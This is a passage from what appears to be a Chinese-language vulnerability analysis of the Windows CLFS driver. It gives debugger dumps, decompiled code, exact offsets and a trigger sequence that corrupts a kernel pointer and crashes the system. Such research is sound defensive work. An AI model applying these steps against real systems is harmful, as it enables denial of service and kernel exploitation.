</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf040  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf050  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf060  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>50</span> <span style=color:#ae81ff>00</span> ff ff <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ........P.......
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf070  <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>27</span> <span style=color:#ae81ff>86</span> fc <span style=color:#ae81ff>26</span> <span style=color:#ae81ff>07</span> <span style=color:#ae81ff>10</span> ee <span style=color:#ae81ff>11</span>  ........<span style=color:#960050;background-color:#1e0010>&#39;</span>..<span style=color:#f92672>&amp;</span>....
</span></span></code></pre></div><p>回到<code>AllocSymbol</code>中，由于<code>SignatureOffset</code>变为<code>0XFFFF0050</code>，导致即使<code>cbSymbolZone</code> 被设为<code>00000000</code>0001114b<code> 也可以通过if条件判断，到达</code>memset`</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>AllocSymbol</span>(CClfsBaseFilePersisted <span style=color:#f92672>*</span>this, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2, <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> v4; <span style=color:#75715e>// rbp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>BaseLogRecord; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v6; <span style=color:#75715e>// r8 this指针
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>v7; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>*</span>v8; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> cbSymbolZone; <span style=color:#75715e>// r8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> result; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> a2;
</span></span><span style=display:flex><span>  BaseLogRecord <span style=color:#f92672>=</span> (CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>)CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetBaseLogRecord</span>(this);
</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> BaseLogRecord;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>BaseLogRecord )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929421</span>i64;
</span></span><span style=display:flex><span>  v8 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>**</span>)(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>48</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>48</span>i64);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  cbSymbolZone <span style=color:#f92672>=</span> BaseLogRecord<span style=color:#f92672>-&gt;</span>cbSymbolZone;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> cbSymbolZone <span style=color:#f92672>+</span> v4 <span style=color:#f92672>&gt;</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(<span style=color:#f92672>&amp;</span>v8<span style=color:#f92672>-&gt;</span>MajorVersion <span style=color:#f92672>+</span> v8<span style=color:#f92672>-&gt;</span>SignaturesOffset) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3221225507</span>i64;
</span></span><span style=display:flex><span>  v10 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> cbSymbolZone;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(v10, <span style=color:#ae81ff>0</span>, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v4);
</span></span><span style=display:flex><span>  v7<span style=color:#f92672>-&gt;</span>cbSymbolZone <span style=color:#f92672>+=</span> v4;
</span></span><span style=display:flex><span>  result <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a3 <span style=color:#f92672>=</span> v10;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq rax<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1328</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c398  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0001114</span>b <span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>03030000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3a8  <span style=color:#ae81ff>00000030</span><span style=color:#960050;background-color:#1e0010>`</span>c1fdf006 <span style=color:#ae81ff>000000</span>b8<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>02</span>d20016
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3b8  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3c8  <span style=color:#ae81ff>0000136</span><span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>000013f</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3d8  <span style=color:#ae81ff>000000</span><span style=color:#ae81ff>88</span><span style=color:#960050;background-color:#1e0010>`</span>c1fdf007 <span style=color:#ae81ff>0000</span><span style=color:#ae81ff>9</span>c40<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>01000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3e8  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c3f8  <span style=color:#ae81ff>01100000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9468</span>c408  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> ffffffff<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><p>那么此处为什么要设为<code>0x1114b</code>呢。</p><p>在多次创建日志文件后，后面创建的每个日志文件的<code>Base log record</code>的内存间距稳定在<code>0x11000</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x70</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x11000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c000  <span style=color:#ae81ff>15</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>03</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>3</span>d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>3</span>d <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ....<span style=color:#f92672>=</span>.<span style=color:#f92672>=</span>.........
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c010  <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ff ff ff ff  ................
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c020  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ff ff ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>70</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ........p.......
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c030  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c040  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c050  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c060  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>80</span> <span style=color:#ae81ff>79</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  .........y......
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c070  <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>93</span> <span style=color:#ae81ff>76</span> <span style=color:#ae81ff>34</span> <span style=color:#ae81ff>8f</span> <span style=color:#ae81ff>1</span>b <span style=color:#ae81ff>10</span> ee <span style=color:#ae81ff>11</span>  .........v4.....
</span></span></code></pre></div><p>此处在调试器中后一个日志文件的<code>container context</code>偏移为0x1468</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dw ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c000<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x328</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c398  <span style=color:#ae81ff>1468</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3a8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3b8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3c8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3d8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3e8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c3f8  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c408  <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dd ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>c000<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1468</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d4d8  c1fdf008 <span style=color:#ae81ff>00000030</span> <span style=color:#ae81ff>000</span><span style=color:#ae81ff>80000</span> <span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d4e8  <span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>93e0</span>d330 ffffa78f
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d4f8  <span style=color:#ae81ff>00000001</span> <span style=color:#ae81ff>00000002</span> <span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d508  <span style=color:#ae81ff>003f</span><span style=color:#ae81ff>005</span>c <span style=color:#ae81ff>005</span>c003f <span style=color:#ae81ff>003</span>a0043 <span style=color:#ae81ff>0055005</span>c
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d518  <span style=color:#ae81ff>00650073</span> <span style=color:#ae81ff>00730072</span> <span style=color:#ae81ff>0050005</span>c <span style=color:#ae81ff>00620075</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d528  <span style=color:#ae81ff>006</span><span style=color:#ae81ff>9006</span>c <span style=color:#ae81ff>005</span>c0063 <span style=color:#ae81ff>0063002</span>e <span style=color:#ae81ff>006e006</span>f
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d538  <span style=color:#ae81ff>00610074</span> <span style=color:#ae81ff>006e0069</span> <span style=color:#ae81ff>00720065</span> <span style=color:#ae81ff>0031005f</span>
</span></span><span style=display:flex><span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d548  <span style=color:#ae81ff>00340031</span> <span style=color:#ae81ff>00360037</span> <span style=color:#ae81ff>0000003</span><span style=color:#ae81ff>9</span> <span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><p>根据伪代码可知<code>memset</code>的位置为<code>BaseLogRecord + 0x 1338 + cbSymbolZone</code></p><p>如果要利用前一个日志文件在<code>AllocSymbol</code>时修改后一个日志文件的<code>container context→pContainer</code>的高四位则应满足下列条件</p><p><code>ffffa78f</code>9469d4f4 = BaseLogRecord + 0x1338 + cbSymbolZone`，计算可得</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span>ffffa78f<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>9469</span>d4f4 <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1338</span> <span style=color:#f92672>-</span> rax
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#ae81ff>69964</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0001114</span>c
</span></span></code></pre></div><p>通过<code>memset</code>将指针高四位清零后，通过NtSetInformationFile函数为container文件设置属性13（关闭时删除文件）。在关闭日志文件句柄时会调用<code>CClfsBaseFilePersisted::RemoveContainer</code>函数移除container，在该函数中会获取<code>container context</code>并解引用<code>container context→pContainer</code>，由于指针损坏，导致蓝屏。</p><p>在<code>CLFS!CClfsBaseFilePersisted::RemoveContainer</code> 断点</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>bp CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db r15
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d4d8  <span style=color:#ae81ff>08</span> f0 fd c1 <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#ae81ff>.0</span>...........
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d4e8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>e0 <span style=color:#ae81ff>37</span> c1 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ........<span style=color:#ae81ff>.7</span>......
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d4f8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d508  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d518  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
